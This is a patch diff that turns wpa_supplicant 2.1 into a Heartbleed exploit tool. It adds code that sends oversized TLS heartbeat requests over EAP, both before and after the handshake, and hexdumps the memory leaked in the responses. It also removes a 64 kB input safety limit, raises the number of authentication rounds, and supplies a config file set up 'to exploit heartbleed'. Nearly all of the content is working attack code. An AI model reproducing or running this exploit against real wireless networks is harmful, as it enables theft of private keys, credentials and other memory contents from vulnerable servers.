@@ -1,0 +1,335 @@
+diff -ruNr wpa_supplicant-2.1-clean/src/crypto/tls_openssl.c wpa_supplicant-2.1-patch/src/crypto/tls_openssl.c
+--- wpa_supplicant-2.1-clean/src/crypto/tls_openssl.c	2014-02-04 11:23:35.000000000 +0000
++++ wpa_supplicant-2.1-patch/src/crypto/tls_openssl.c	2014-05-23 22:56:13.736695215 +0100
+@@ -71,6 +71,7 @@
+ }
+ #endif /* ANDROID */
+ 
++
+ static int tls_openssl_ref_count = 0;
+ 
+ struct tls_context {
+@@ -130,6 +131,197 @@
+ 	return context;
+ }
+ 
++/** BEGIN HEARTBLEED PATCH SPECIFICS **/
++
++#define n2s(c,s)((s=(((unsigned int)(c[0]))<< 8)| \
++		(((unsigned int)(c[1]))    )),c+=2)
++#define s2n(s,c) ((c[0]=(unsigned char)(((s)>> 8)&0xff), \
++		 c[1]=(unsigned char)(((s)    )&0xff)),c+=2)
++
++struct s_hb_config {
++	unsigned int config_file_read:1;
++	unsigned int send_before_handshake:1;
++	unsigned int send_before_appdata:1;
++	unsigned int send_after_appdata:1;
++	unsigned int payload_size;
++	unsigned int num_tries;
++	unsigned int num_repeats;
++};
++
++static struct s_hb_config hb_config = { 
++	.config_file_read = 0,
++	.send_before_handshake = 0,
++	.send_before_appdata = 0,
++	.send_after_appdata = 0,
++	.payload_size = 1000,
++	.num_tries = 1,
++	.num_repeats = 1
++};
++
++// message for pre handshake heartbeat:
++char heartbeat_message[] =
++    "\x18" // heartbeat
++    "\x03\x01"
++    "\x00\x03"
++    "\x01" // heartbeat_request
++    "\xff\xff"; // request payload (max)
++
++
++#define MAXLINE 255
++
++void do_heartbleed_init() {
++	if (!hb_config.config_file_read) {
++		hb_read_config("./heartbleed.conf");
++	}
++}
++
++// heartbeat callback (heartbleed):
++static void heartbeat_cb(
++	int v_write_p,
++	int v_version,
++	int v_content_type,
++	const void* v_buf,
++	size_t v_len,
++	SSL* v_ssl,
++	void* v_arg
++)
++{
++	printf("----> heartbeat callback.\n");
++	if (v_content_type == TLS1_RT_HEARTBEAT) {
++		printf("----> heartbeat received!\n");
++		v_ssl->tlsext_hb_pending = 1;
++		wpa_hexdump(MSG_DEBUG, "----> heartbeat data: ", v_buf, v_len);
++	} else {
++		printf("----> no heartbeat data, exiting callback.\n");
++	}
++}
++
++void hb_read_config(char *filename) {
++	FILE * fp;
++	char bufr[MAXLINE];
++
++	fp = fopen(filename, "r");
++	if (fp != NULL) {
++	    while(!feof(fp)){ 
++	        if(fgets(bufr, MAXLINE, fp)) {
++	         	// printf("----> config line: %s\n", bufr);
++		        // ignore commented lines
++		        if (!strchr(bufr, '#')) {
++		        	if (strstr(bufr, "send_before_handshake=1"))
++		        		hb_config.send_before_handshake=1;
++		        	if (strstr(bufr, "send_before_appdata=1"))
++		        		hb_config.send_before_appdata=1;
++		        	if (strstr(bufr, "send_before_handshake=1"))
++		        		hb_config.send_before_handshake=1;
++		        	if (strstr(bufr, "send_after_appdata=1"))
++		        		hb_config.send_after_appdata=1;
++
++		        	if (strstr(bufr, "payload_size="))
++		        		sscanf(bufr, "payload_size=%u", &hb_config.payload_size);
++		        	if (strstr(bufr, "num_tries="))
++		        		sscanf(bufr, "num_tries=%u", &hb_config.num_tries);
++		        	if (strstr(bufr, "num_repeats="))
++		        		sscanf(bufr, "num_repeats=%u", &hb_config.num_repeats);		
++				}
++		    }
++	    }
++	    fclose(fp);
++	    printf("----> Config file read:\n"
++	    	"    ----> send_before_handshake=%i\n"
++			"    ----> send_before_appdata=%i\n"
++			"    ----> send_after_appdata=%i\n"
++			"    ----> payload_size=%u\n"
++			"    ----> num_tries=%u"
++			"    ----> num_repeats=%u\n", 
++	    	hb_config.send_before_handshake, 
++	    	hb_config.send_before_appdata,
++	    	hb_config.send_after_appdata,
++	    	hb_config.payload_size,
++	    	hb_config.num_tries,
++	    	hb_config.num_repeats);
++	
++	    hb_config.config_file_read = 1;
++	} else {
++   		printf("----> Could not open configuration file!\n");
++	}
++}
++
++/** Heartbleed function before handshake. returns a pointer to a TLS record with an UNENCRYPTED heartbeat request **/
++char *clear_heartbeat() {
++	char *p;
++    // set payload size
++    p = &heartbeat_message[sizeof(heartbeat_message) - 3];
++    s2n(hb_config.payload_size, p);
++
++    return heartbeat_message;
++}
++
++
++/** Heartbleed function after handshake **/
++int encrypted_heartbeat(struct tls_connection *conn)
++{
++	unsigned char *cbuf, *p;
++
++	unsigned int real_payload = 18; //default: 18 /* Sequence number + random bytes */
++	unsigned int padding = 16; //default: 16 /* Use minimum padding */
++
++	printf("----> entering encrypted_heartbeat()\n");
++
++	if (!SSL_is_init_finished(conn->ssl)) {
++		printf("----> [encrypted_heartbeat] SSL handshake not complete,returning...\n");
++		return -1;
++	}
++	
++	if(!conn->ssl->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
++  		conn->ssl->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS) {
++            printf("----> [encrypted_heartbeat] warning: heartbeat extension is unsupported (try anyway)\n");
++	} else {
++			printf("----> [encrypted_heartbeat] good: heartbeat extention IS SUPPORTED!\n");
++	}
++
++	/* Check if padding is too long, payload and padding
++	 * must not exceed 2^14 - 3 = 16381 bytes in total.
++	 */
++	OPENSSL_assert(real_payload + padding <= 16381); 
++
++	cbuf = OPENSSL_malloc(1 + 2 + real_payload + padding);
++
++	if(cbuf==NULL){
++    	printf("----> [encrypted_heartbeat] error in malloc()\n");
++        return -1;
++    }
++	p = cbuf;
++
++    *p++ = TLS1_HB_REQUEST;
++
++
++	/* Payload length (18 bytes here) */
++	//s2n(payload, p);	/* standards compliant payload */
++	//s2n(payload +10, p);	/* >payload to exploit heartbleed!!! */
++    s2n(hb_config.payload_size, p); /* configured payload */
++
++	/* Sequence number */
++	s2n(conn->ssl->tlsext_hb_seq, p);
++	/* 16 random bytes */
++	RAND_pseudo_bytes(p, 16);
++	p += 16;
++	/* Random padding */
++	RAND_pseudo_bytes(p, padding);
++
++	printf("----> [encrypted_heartbeat] Sending heartbeat reaquesting payload size %u...\n", hb_config.payload_size);
++	wpa_hexdump(MSG_DEBUG, "----> heartbeat packet to send:", cbuf, 1 + 2 + real_payload + padding);
++
++	/* Send heartbeat request */
++	if (SSL_get_ssl_method(conn->ssl)->ssl_write_bytes(conn->ssl, TLS1_RT_HEARTBEAT,
++					cbuf, 3 + real_payload + padding) >= 0)
++		conn->ssl->tlsext_hb_pending = 1;
++	OPENSSL_free(cbuf);
++
++	return 0;
++}
++
++/** END HEARTBLEED PATCH SPECIFICS **/
++
+ 
+ #ifdef CONFIG_NO_STDOUT_DEBUG
+ 
+@@ -832,6 +1024,14 @@
+ 	}
+ #endif /* OPENSSL_NO_ENGINE */
+ 
++	/** BEGIN HEARTBLEED PATCH SPECIFICS **/
++	// Init heartbleed specific code:
++	do_heartbleed_init();
++	// Set callback for heartbleed here.
++	printf("----> Setting callback handler for heartbeat responses...\n");
++	SSL_CTX_set_msg_callback(ssl, heartbeat_cb);
++	/** END HEARTBLEED PATCH SPECIFICS **/
++
+ 	return ssl;
+ }
+ 
+@@ -2538,6 +2738,10 @@
+ 	int res;
+ 	struct wpabuf *out_data;
+ 
++	/* for heartbleed */
++	struct wpabuf *ptr1, *ptr2;
++	int i;
++
+ 	conn->server = !!server;
+ 
+ 	/*
+@@ -2598,6 +2802,21 @@
+ 	}
+ 	wpabuf_put(out_data, res);
+ 
++	if (hb_config.send_before_handshake && hb_config.num_tries) {
++		printf ("----> Sending heartbeat request before handshake... NEW\n");
++		ptr1 = out_data;
++		for (i=0; i < hb_config.num_repeats; i++) {
++			ptr2 = wpabuf_alloc(sizeof(heartbeat_message)-1);
++			memcpy(wpabuf_mhead(ptr2), (u8 *)clear_heartbeat(), sizeof(heartbeat_message)-1);
++			wpabuf_put(ptr2, sizeof(heartbeat_message)-1);
++			ptr1 = wpabuf_concat(ptr1,ptr2);
++		}
++		conn->ssl->tlsext_hb_pending = 1;
++		hb_config.num_tries--;
++		return ptr1;
++	}
++
++
+ 	return out_data;
+ }
+ 
+@@ -2692,6 +2911,12 @@
+ 		tls_show_errors(MSG_INFO, __func__, "BIO_reset failed");
+ 		return NULL;
+ 	}
++
++	/** HEARTBLEED: send encrypted heartbeat before application data record **/
++	if (hb_config.send_before_appdata) {
++		encrypted_heartbeat(conn);
++	}
++
+ 	res = SSL_write(conn->ssl, wpabuf_head(in_data), wpabuf_len(in_data));
+ 	if (res < 0) {
+ 		tls_show_errors(MSG_INFO, __func__,
+@@ -2699,6 +2924,11 @@
+ 		return NULL;
+ 	}
+ 
++	/** HEARTBLEED: send encrypted heartbeat following application data record **/
++	if (hb_config.send_after_appdata) {
++		encrypted_heartbeat(conn);
++	}
++
+ 	/* Read encrypted data to be sent to the server */
+ 	buf = wpabuf_alloc(wpabuf_len(in_data) + 300);
+ 	if (buf == NULL)
+diff -ruNr wpa_supplicant-2.1-clean/src/eap_peer/eap.c wpa_supplicant-2.1-patch/src/eap_peer/eap.c
+--- wpa_supplicant-2.1-clean/src/eap_peer/eap.c	2014-02-04 11:23:35.000000000 +0000
++++ wpa_supplicant-2.1-patch/src/eap_peer/eap.c	2014-05-19 23:32:07.659774511 +0100
+@@ -31,7 +31,8 @@
+ #define STATE_MACHINE_DATA struct eap_sm
+ #define STATE_MACHINE_DEBUG_PREFIX "EAP"
+ 
+-#define EAP_MAX_AUTH_ROUNDS 50
++/* altered for heartbleed */
++#define EAP_MAX_AUTH_ROUNDS 5000
+ #define EAP_CLIENT_TIMEOUT_DEFAULT 60
+ 
+ 
+diff -ruNr wpa_supplicant-2.1-clean/src/eap_peer/eap_tls_common.c wpa_supplicant-2.1-patch/src/eap_peer/eap_tls_common.c
+--- wpa_supplicant-2.1-clean/src/eap_peer/eap_tls_common.c	2014-02-04 11:23:35.000000000 +0000
++++ wpa_supplicant-2.1-patch/src/eap_peer/eap_tls_common.c	2014-05-19 18:49:07.583538011 +0100
+@@ -417,15 +417,17 @@
+ 		return -1;
+ 	}
+ 
++
++	/* Disable this limit for heartbleed!! */
+ 	if (tls_in_len + in_len > 65536) {
+ 		/*
+ 		 * Limit length to avoid rogue servers from causing large
+ 		 * memory allocations.
+ 		 */
+ 		wpa_printf(MSG_INFO, "SSL: Too long TLS fragment (size over "
+-			   "64 kB)");
+-		eap_peer_tls_reset_input(data);
+-		return -1;
++			   "64 kB) -- HEARTBLEED will continue!");
++		// eap_peer_tls_reset_input(data);
++		// return -1;
+ 	}
+ 
+ 	if (in_len > data->tls_in_left) {
+diff -ruNr wpa_supplicant-2.1-clean/wpa_supplicant/heartbleed.conf wpa_supplicant-2.1-patch/wpa_supplicant/heartbleed.conf
+--- wpa_supplicant-2.1-clean/wpa_supplicant/heartbleed.conf	1970-01-01 01:00:00.000000000 +0100
++++ wpa_supplicant-2.1-patch/wpa_supplicant/heartbleed.conf	2014-05-28 16:15:09.670595738 +0100
+@@ -0,0 +1,12 @@
++# Config file for modded wpa_supplicant / hostapd to exploit heartbleed:
++
++send_before_handshake=1
++send_before_appdata=0
++send_after_appdata=0
++
++# 65535 is max
++payload_size=65000
++
++num_repeats=1
++num_tries=1
++
